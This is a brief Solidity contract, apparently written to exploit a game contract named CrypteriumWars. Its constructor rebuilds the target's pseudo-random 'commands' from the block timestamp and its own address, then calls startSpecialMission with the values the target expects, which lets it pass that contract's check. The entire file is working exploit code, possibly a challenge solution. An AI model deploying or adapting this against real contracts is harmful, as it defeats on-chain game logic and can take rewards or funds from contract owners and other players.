pragma solidity ^0.4.24;

contract CrypteriumWars {
    function startSpecialMission(uint commandOne, bytes8 _commandTwo) external;
}

contract CompleteSpecialMission {
    CrypteriumWars target;

    bytes32 mask1 = 0x00000000000000000000000000FFFFFFFFFFFFFFFF;
    bytes32 mask2 = 0xffffffffffffffff000000000000000000000000000000000000000000000000;
    bytes8 mask3 = 0xFFFFFFFFFFFFFFFF;

    constructor(address _target) public {
        target = CrypteriumWars(_target);
        uint commandOne = (uint(keccak256(abi.encodePacked(now, this))) % 100) + 1;
        bytes8 commandTwo = bytes8(((keccak256(abi.encodePacked(commandOne, this))) & mask1) << ((24) * 8) & mask2) ^ mask3;
        target.startSpecialMission(commandOne, commandTwo);
    }

}
